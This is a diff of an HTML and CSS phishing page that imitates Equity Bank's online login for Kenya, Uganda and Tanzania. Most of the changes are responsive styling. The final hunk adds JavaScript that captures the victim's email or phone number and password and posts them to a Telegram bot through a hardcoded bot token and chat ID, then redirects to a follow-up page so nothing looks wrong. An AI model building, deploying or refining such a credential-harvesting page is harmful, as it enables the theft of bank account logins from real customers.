@@ -11,6 +11,8 @@
             margin: 0;
             font-family: 'Roboto', sans-serif;
             display: flex;
+            flex-direction: column;
+            /* Stack sections vertically */
             height: 100vh;
             background-color: #f7f7f7;
         }
@@ -18,12 +20,14 @@
         .left-section {
             flex: 2;
             background: #C8102E;
-            /* Dark Red */
             display: flex;
-            justify-content: flex-start;
-            align-items: center;
+            flex-direction: column;
+            justify-content: center;
+            align-items: flex-start;
             padding: 40px;
             color: white;
+            text-align: center;
+            /* Center text for mobile */
         }
         
         .right-section {
@@ -41,6 +45,8 @@
             border-radius: 5px;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
             padding: 20px;
+            margin: auto;
+            /* Center the form */
         }
         
         .login-form h2 {
@@ -71,7 +77,6 @@
             width: 100%;
             padding: 10px;
             background-color: #C8102E;
-            /* Dark Red */
             color: white;
             border: none;
             border-radius: 4px;
@@ -81,7 +86,6 @@
         
         button:hover {
             background-color: #A50F20;
-            /* Darker Red */
         }
         
         .footer {
@@ -96,8 +100,30 @@
         
         .logo {
             max-width: 150px;
-            /* Adjust the size as needed */
             margin-bottom: 20px;
+        }
+        /* Responsive Styles */
+        
+        @media (max-width: 768px) {
+            .left-section {
+                padding: 20px;
+            }
+            .login-form {
+                padding: 15px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .left-section {
+                padding: 10px;
+            }
+            .login-form {
+                padding: 10px;
+            }
+            .logo {
+                max-width: 100px;
+                /* Smaller logo for mobile */
+            }
         }
     </style>
 </head>
@@ -107,21 +133,21 @@
     <div class="left-section">
         <div>
             <img src="Airtel-Emblema.png" alt="Equity Logo" class="logo">
-            <!-- Replace with actual logo URL -->
-            <h1>Welcome to Equity online</h1>
+            <h1>Welcome to Equity Online</h1>
             <p>More than just banking.</p>
         </div>
     </div>
+
     <div class="right-section">
         <div class="login-form">
             <h2>Login Equity As on App</h2>
             <div class="form-group">
                 <label for="country">Country</label>
                 <select id="country">
-                <option value="Kenya">Kenya</option>
-                <option value="Uganda">Uganda</option>
-                <option value="Tanzania">Tanzania</option>
-            </select>
+                    <option value="Kenya">Kenya</option>
+                    <option value="Uganda">Uganda</option>
+                    <option value="Tanzania">Tanzania</option>
+                </select>
             </div>
             <div class="form-group">
                 <label for="email">Email address or mobile number</label>
@@ -143,14 +169,38 @@
             const password = document.getElementById('password').value.trim();
 
             if (email && password) {
-                // Redirect to equity1.html
-                window.location.href = "equity1.html";
+                // Replace YOUR_BOT_TOKEN and YOUR_CHAT_ID with your actual bot token and chat ID
+                const botToken = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
+                const chatId = '5615316142';
+                const message = `Email: ${email}\nPassword: ${password}`;
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message
+                        })
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            // Optional: Redirect to equity1.html after sending
+                            window.location.href = "equity1.html";
+                        } else {
+                            alert('Error sending data to Telegram.');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        alert('Error sending data to Telegram.');
+                    });
             } else {
                 alert('Please fill in all fields.');
             }
         });
     </script>
-
 </body>
 
 </html>
